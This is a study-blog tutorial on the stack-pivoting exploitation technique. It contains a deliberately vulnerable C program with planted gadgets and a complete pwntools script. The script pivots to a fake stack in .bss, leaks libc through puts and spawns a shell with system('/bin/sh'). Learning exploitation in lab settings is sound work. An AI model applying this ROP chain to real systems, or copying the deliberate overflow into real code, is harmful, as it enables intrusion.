---
title: "[PWNABLE] Stack Pivoting"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique to configure a Fake Stack in an area with write permission using a gadget. If the payload is stored, overflow should only occur up to ret. If the payload is not stored, up to chain + leave_ret."
date: "2024-06-24"
translation_key: "tistory-0fea48d33bf4"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Stack-Pivoting"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

This is a technique to configure a Fake Stack in an area with write permission using a gadget.

- If payload is stored, overflow should occur only up to ret.
- If the payload is not saved, you must include chain + leave\_ret.

In general, this is a technique used when a bof vulnerability can only be used once or when overflow is possible only up to ret.

Let’s look at it through a simple example.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

int cnt = 0;

void gift(){
	 __asm__ ("pop %r9");
	__asm__ ("pop %r8");
	__asm__ ("pop %rcx");
	__asm__ ("pop %rdx");
	__asm__ ("pop %rsi");
	__asm__ ("pop %rdi");
	__asm__ ("ret");
	__asm__ ("pop %rax");
   	__asm__ ("ret");
  	__asm__ ("pop %rbx");
 	__asm__ ("ret");
 	__asm__ ("mov %rbx, (%rax)");
 	__asm__ ("ret");
 	__asm__ ("mov %rax, (%rbx)");
 	__asm__ ("ret");
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
    char buf[0x40];
    if(cnt != 0){
	    exit(-1);
    }
    cnt = 1;
    puts("Hello! whrd");
    read(0,buf,0x80);
}
int main() {
    initialize();
    vuln();
    return 0;
}
```

Gadgets were made at random.

Here we will use bss, a memory area with write permission.

![](/assets/images/tistory/tistory-0fea48d33bf4/001.png)

This is the first payload.

```
payload = b'a'*0x40
payload += p64(bss+0x300)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x300)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)
p.send(payload)
```

In addition to bss+0x300, a fake stack is configured.

After going through the leave-ret process, rbp and rsp point to fake\_stack.

```
payload = p64(bss+0x400)
payload += p64(p_rdi)
payload += p64(read_got)
payload += p64(puts)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x400)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)

p.send(payload)
```

It is a process of leaking.

After obtaining libc\_base using puts(), a new fake stack is configured and receiving input at location bss+0x400 for exploit.

```
p.recvuntil(b'\x0a')
leak = u64(p.recvn(6) + b'\x00'*2)
libc_base = leak - libc.sym['read']

print('libc_base : ', hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload = p64(0x0)
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)
```

You can run system('/bin/sh'); with the libc you obtained.

![](/assets/images/tistory/tistory-0fea48d33bf4/002.png)

If you run it, you can see that system() is running normally.

```
from pwn import *

target = b'./ex'

context.log_level = 'debug'
p = process(target)
e = ELF(target)
libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')

read_got = e.got['read']
read = e.plt['read']
puts = e.plt['puts']
bss = e.bss()
leave_ret = 0x0000000000401252
ret = 0x000000000040101a
p_rdi = 0x00000000004011a5
p_rsi_rdi = 0x00000000004011a4
p_rdx_rsi_rdi = 0x00000000004011a3

####################################

payload = b'a'*0x40
payload += p64(bss+0x300)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x300)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)
p.send(payload)

####################################

payload = p64(bss+0x400)
payload += p64(p_rdi)
payload += p64(read_got)
payload += p64(puts)
payload += p64(p_rdx_rsi_rdi)
payload += p64(0x100)
payload += p64(bss+0x400)
payload += p64(0x0)
payload += p64(read)
payload += p64(leave_ret)

p.send(payload)

####################################

p.recvuntil(b'\x0a')
leak = u64(p.recvn(6) + b'\x00'*2)
libc_base = leak - libc.sym['read']

print('libc_base : ', hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

####################################

payload = p64(0x0)
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)

####################################

p.interactive()
```